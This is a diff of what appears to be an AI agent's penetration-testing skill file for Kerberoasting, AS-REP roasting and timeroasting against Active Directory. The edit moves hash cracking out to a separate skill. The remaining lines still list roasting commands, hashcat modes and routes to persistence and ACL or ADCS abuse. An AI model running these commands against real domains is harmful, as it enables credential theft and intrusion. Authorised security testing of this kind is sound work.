@@ -20,8 +20,6 @@ tools:
   - GetNPUsers.py)
   - Rubeus
   - netexec
-  - hashcat
-  - john
   - targetedKerberoast.py
 opsec: medium
 ---
@@ -69,7 +67,7 @@ and records state changes. Your return summary must include:
 - Any valid domain user credential (for standard Kerberoasting/AS-REP roasting)
 - OR: a username with DONT_REQ_PREAUTH (for Kerberoasting without a domain account)
 - OR: just a username list (for AS-REP roasting without authentication)
-- Tools: Impacket, `hashcat` or `john`, optionally `netexec`, `Rubeus`, `bloodyAD`
+- Tools: Impacket, optionally `netexec`, `Rubeus`, `bloodyAD`
 
 **Kerberos-first authentication:**
 
@@ -105,7 +103,7 @@ confirm completion (ntpdate).
 **Non-privileged commands** Claude can execute directly:
 - All roasting tools: `GetUserSPNs.py`, `GetNPUsers.py`, `netexec`, `Rubeus`
 - Targeted kerberoasting: `targetedKerberoast.py`, `bloodyAD`
-- Cracking: `hashcat`, `john`
+- Cracking: delegate to **credential-cracking** skill
 
 ## Step 1: Assess
 
@@ -227,30 +225,16 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv kerbero
 
 **Cracking speed: RC4 is ~1000x faster than AES.** Always prefer RC4 tickets.
 
-### Hashcat
+**Do NOT crack hashes in this skill.** Save hashes to `engagement/evidence/`
+and return to the orchestrator with the hash file path, hash type/mode (see
+table above), and a routing recommendation to **credential-cracking**.
 
 ```bash
-# RC4 (fast — billions/sec on modern GPU)
-hashcat -m 13100 -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt
-
-# RC4 with rules
-hashcat -m 13100 -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt \
-  -r /usr/share/hashcat/rules/best64.rule
-
-# AES128
-hashcat -m 19600 -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt
-
-# AES256
-hashcat -m 19700 -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt
+# Save extracted TGS hashes to evidence
+cp hashes.kerberoast engagement/evidence/kerberoast-tgs-hashes.txt
 ```
 
-### John the Ripper
-
-```bash
-john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt hashes.kerberoast
-```
-
-### After Cracking
+### After Cracking (post credential-cracking)
 
 With recovered service account credentials:
 1. Check what the account has access to (BloodHound, nxc)
@@ -300,15 +284,20 @@ GetNPUsers.py DOMAIN/targetuser -no-pass -dc-ip DC_IP
 .\Rubeus.exe asreproast /user:targetuser /format:hashcat /outfile:asrep-hashes.txt
 ```
 
-### Crack AS-REP Hashes
+### AS-REP Hash Format Reference
 
 | Hash Prefix | Hashcat Mode | John Format |
 |-------------|--------------|-------------|
 | `$krb5asrep$23$` | `18200` | `krb5asrep` |
 
+**Do NOT crack hashes in this skill.** Save AS-REP hashes to
+`engagement/evidence/` and return to the orchestrator with the hash file path,
+hash type (AS-REP / hashcat mode 18200), and a routing recommendation to
+**credential-cracking**.
+
 ```bash
-hashcat -m 18200 -a 0 asrep-hashes.txt /usr/share/wordlists/rockyou.txt
-john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep-hashes.txt
+# Save extracted AS-REP hashes to evidence
+cp asrep-hashes.txt engagement/evidence/asrep-hashes.txt
 ```
 
 ## Step 6: Kerberoasting Without a Domain Account
@@ -379,13 +368,16 @@ Exploits Windows NTP authentication to extract hashes for computer accounts.
 # Request NTP hashes for all computer accounts
 sudo timeroast.py DC_IP | tee ntp-hashes.txt
 
-# Crack
-hashcat -m 31300 ntp-hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
 | Hash Type | Hashcat Mode |
 |-----------|--------------|
 | NTP (timeroast) | `31300` |
+
+**Do NOT crack hashes in this skill.** Save NTP hashes to
+`engagement/evidence/timeroast-hashes.txt` and return to the orchestrator with
+the hash file path, hash type (NTP / hashcat mode 31300), and a routing
+recommendation to **credential-cracking**.
 
 **Practical value is limited**: Computer account passwords are typically 120+
 random characters. Most useful against **trust accounts** between domains,
@@ -402,8 +394,8 @@ After cracking credentials:
   impersonation attacks
 - **Service account has ADCS enrollment**: Route to **adcs-template-abuse**
 - **Service account has dangerous ACLs**: Route to **acl-abuse**
-- **No credentials cracked**: Try larger wordlists, rules, or route to
-  **password-spraying** for a different approach
+- **No credentials cracked**: Route to **credential-cracking** with larger
+  wordlists/rules, or route to **password-spraying** for a different approach
 - **Need persistence on cracked account**: Route to **ad-persistence** or set
   SPN for re-roasting later
 
